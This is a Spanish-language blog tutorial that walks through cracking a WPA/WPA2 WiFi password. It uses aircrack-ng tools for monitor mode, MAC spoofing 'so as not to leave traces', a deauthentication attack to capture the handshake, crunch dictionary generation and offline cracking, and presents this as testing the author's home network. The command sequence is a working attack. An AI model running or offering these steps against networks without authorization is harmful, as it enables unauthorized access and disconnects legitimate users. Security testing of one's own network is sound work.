---
layout: single

title: Hacking Wifi - Pentesting Wifi

excerpt: "**El ataque que presento**
consiste en obtener el handshake WPA/WPA2 que se lleva a cabo entre las estaciones (clientes Wi-Fi) y el BSSID (punto de acceso) para intercambiar la clave compartida de cifrado de la red Wi-Fi durante la fase de autenticación, y luego intentar romperlo off-line mediante un diccionario de contraseñas."
date: 2022-07-29

classes: wide

header:

    teaser: /assets/images/wifi/logo.png

    teaser_home_page: true
    
    icon: /assets/images/logofairy.png

categories:

    - Wifi Slax
    - Kali Linux
    - Hacking Wifi
    - Wifi
    - Pentesting

tags:  

- Hacking WiFi
---

![](/assets/images/wifi/wallpapers.png)

La idea de esta guía es comprobar la seguridad de una red wifi. 

Para comenzar con esta practica se necesita una distribución GNU/Linux, la suite de software de seguridad inalámbrica **Aircrak-ng** y **Macchanger**.

* GNU/Linux: Recomiendo un live de Kali Linux o Wifi Slax.
* AIRCRACK-NG: Suite de software de seguridad inalámbrica. 
* MACCHANGER: Permite cambiar la Dirección **MAC** de una interfaz.

En caso de que se use alguna distribución de las cuales no son orientadas a Pentesting, se puede instalar las herramientas de la siguiente manera:

```bash
apt install aircrak-ng macchanger
```

El equipo que utilizo para este ejemplo es una Netbook de conectar igualdad.


![](/assets/images/wifi/debian.png)


## MODO MONITOR

El modo monitor permite capturar los paquetes que viajan en el aire y obtener información de los clientes denominados estaciones, que se encuentran dentro de una red WiFi y sus respectivas **MAC**. 

Hay que distinguir entre el **ESSID** que generalmente es el nombre que hace referencia al la red WiFi y el **BSSID** que hace referencia a la dirección MAC del dispositivo.

Para poner la tarjeta WiFi en ""modo monitor" es necesario conocer el nombre de la interfaz:


```bash
sudo ifconfig
```
![](/assets/images/wifi/ifconfig.png)

Como se puede observar en la imagen, el nombre de mi interfaz es **wlp3s0** y para activar el "modo monitor" se debe ejecutar el siguiente comando:

```bash
sudo airmon-ng start wlp3s0
```
![](/assets/imagen/wifi/monitor.png)

Ahora el nombre de la interfaz cambio a **wlp3s0mon**. Este nombre se debe a que la interfaz se encuentra en "modo monitor".

Si se ejecuta el comando _ifconfig_ se puede ver la descripción de la interfaz. 

Teniendo en cuenta que el ataque se realizara con nuestro ordenador, no se debe dejar huellas. Aquí es donde entra **macchanger**, el cual permite asignar una nueva dirección **MAC** aleatoria a cualquier interfaz.

Para lograr cambiar la dirección **MAC** de la interfaz monitor se deben seguir tres paso:

* Apagar la interfaz.
* Usar Macchanger.
* Activar la interfaz.

```bash
sudo ifconfig wlp3s0mon down
sudo macchanger -a wlp3s0mon
sudo ifconfig wlp3s0mon up
```
![](/assets/images/wifi/macchanger.png)

Ahora que todo esta configurado correctamente es hora de analizar el trafico que pasa por el aire.

![](/assets/images/wifi/airodump-ng.png)

* **PWR** hace referencia al "power". Cuanto mas bajo sea el valor, mejor es la señal que se recibe.

Luego de unos segundos se puede detener el análisis y elegir una red para **sniffear**. 

En este ejemplo usare la red de mi hogar:

```bash
airodump-ng --channel 1 -w wifi-casa --bssid xx:xx:xx:xx wlp3s0mon
```

* **- -channel:** el canal que utiliza la red WiFi.
* **-w:** nombre del archivo donde se guardara información.
* **- -bssid:** mac del router.
* **wlp3s0mon:** nombre de la interfaz monitor.

![](/assets/images/wifi/airodump-wifi-casa.png)

Dentro del directorio donde se esta ejecutando el ataque se crearon varios archivos, entre los cuales solo sera útil el que finaliza con extensión **.cap**.

![](/assets/images/wifi/ls.png)

## DES-AUTENTICACIÓN

El proceso para poder obtener el password de la red WiFi es desconectar a un cliente de la red con un ataque de **des-autenticación** generado por nuestro ordenador y así poder obtener el **HANDSHAKE**.

Utilizando **aireplay** se puede des-autenticar a un cliente de una red.

La sintaxis del comando es:

**aireplay-ng --deauth 4 -a "mac-wifi" -c "mac-cliente" wlp3s0mon**

```bash
sudo aireplay-ng --deauth 4 -a ec:e4:xx:xx:xx:xx -c e4:g3:xx:xx:xx:xx wlp3s0mon
```

![](/assets/images/wifi/deauth.png)

Con esto se logra capturar el **HANDSHAKE**, al caul por medio de un diccionario de furza bruta se podrá obtener la clave de la red WiFi.


## DICCIONARIO

Para crear un diccionario usare la herramienta **crunch**. La cual permite generar diccionarios de claves en función de diversos parámetros.
 
La sintaxis para crear un diccionario con **crunch** es la siguiente:

**crunch [nin] [max] [caracteres] -t [patron] -o [nombre del archivo]**

```bash
crunch 8 8 0123456789 -t 36@@@@@@ -o diccionario
```

![](/assets/images/wifi/diccionario.png)

El diccionario generado cuenta con miles de contraseñas de 8 dígitos.

![](/assets/images/wifi/diccionario1.png)

## CRACKERAR

Para crackear el **HANDSHAKE** solo bastara con **aircrack-ng** y el tiempo que se demore dependerá de la potencia del **CPU**.



```bash
sudo aircrack-ng wifi-casa-06.cap -w diccionario
```
![](/assets/images/wifi/crack.png)

Clave obtenida.

![](/assets/images/wifi/crack1.png)

La velocidad de mi **CPU** es 517 claves por segundos y le tomo 25 segundos en poder descifrar la clave de la red WiFi.

**Salir del modo monitor:**
 
```bash
sudo airmon-ng stop wlp3s0mon
```

Para conocer mas sobre la suite de aircrack-ng se puede visitar su pagina web.

- [Aircrack-ng](https://www.aircrack-ng.org/)
